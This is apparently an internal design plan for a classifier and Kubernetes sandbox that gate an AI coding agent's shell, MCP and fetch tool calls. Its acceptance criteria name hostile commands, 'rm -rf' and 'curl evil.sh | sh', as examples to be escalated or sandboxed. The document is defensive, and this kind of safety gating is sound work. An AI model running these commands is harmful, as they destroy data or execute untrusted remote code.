# 07 — Tool‑Call Safety Classifier + Sandboxing

**Cursor parity:** v3.6 Auto‑review run mode + classifier subagent. **Priority: P1.**
This is the gate that makes plan 02 (unattended background agents) *safe*.

## What Cursor does (v3.6, May 2026)

An **auto‑review run mode** lets agents run with far fewer approval prompts. A
**classifier subagent** evaluates each Shell / MCP / Fetch tool call: safe calls
are **allowlisted** and run immediately; risky ones are **sandboxed** (isolated)
or escalated for approval. Custom instructions steer the classifier.

## How it works (concepts to steal)

1. **Per‑tool‑call risk classification** — a fast model judges each call
   (read‑only? destructive? exfiltration? network egress?).
2. **Three outcomes:** allow (allowlist) → sandbox (run isolated, no creds/egress)
   → escalate (human approval).
3. **Allowlist learning** of repeatedly‑safe calls to cut prompt fatigue.
4. **Custom policy** so an org tightens/loosens behaviour.

## DevAI mapping (framework)

- New **`safety/`** subsystem: `classifier.py` (fast LLM via `adapters/llm`, e.g.
  Groq/Haiku for latency) + `policy.py` (allow/deny/sandbox rules) +
  `decision.py`.
- **Interceptor** in `tools/`: every tool call passes through
  `safety.evaluate(call, context)` → `allow | sandbox | escalate`.
- **Sandbox = our K8s Job runner** (plan 02) with a locked‑down profile: no
  secrets mounted, `NetworkPolicy` egress‑deny, read‑only FS, short TTL. We
  already build Jobs — add a `sandbox` profile.
- **Escalate** → existing `approval_gates` + dashboard approval banner.
- **Policy as config + repo rules** (plan 06): `.devai/rules/safety.yaml` tunes
  the classifier per repo.
- Every decision is **audited** (`audit_log` table exists).

## Implementation plan

- **Phase 1 — classifier + policy.** Deterministic allowlist (e.g. `git status`,
  `ls`, read‑only SQL) short‑circuits before any LLM call; LLM judges the rest.
- **Phase 2 — interceptor** wrapping shell/MCP/fetch tools; wire `evaluate()`.
- **Phase 3 — sandbox Job profile** (no creds, egress‑deny NetworkPolicy, ro‑fs).
- **Phase 4 — escalation + audit + allowlist learning.**

## Files & modules

```
src/devai/safety/{classifier,policy,decision,interceptor}.py
src/devai/runner/jobspec.py             # +sandbox profile (plan 02)
src/devai/tools/*                       # route calls through interceptor
tesserix-k8s: NetworkPolicy (egress-deny) for sandbox namespace
tests/unit/test_safety_classifier.py
```

## Config (`DEVAI_*`)

```
DEVAI_SAFETY_ENABLED=true
DEVAI_SAFETY_CLASSIFIER_MODEL=llama-3.3-70b-versatile   # fast/cheap
DEVAI_SAFETY_DEFAULT=sandbox            # allow|sandbox|escalate when unsure
DEVAI_SAFETY_ALLOWLIST_LEARNING=true
DEVAI_SAFETY_AUTO_REVIEW=true           # fewer prompts for allowlisted calls
```

## Acceptance criteria

- `rm -rf` / `curl evil.sh | sh` → escalate or sandbox; `git status` → allow.
- Sandboxed call runs in a Job with no secrets and egress denied (verified).
- Unknown call defaults to the configured safe outcome; every decision audited.
- Custom `.devai/rules/safety.yaml` flips a specific call's verdict.

## Sources

- [Cursor Changelog v3.6 — Auto‑review run mode](https://cursor.com/changelog)
- [Securing our codebase with autonomous agents · Cursor](https://cursor.com/blog/security-agents)
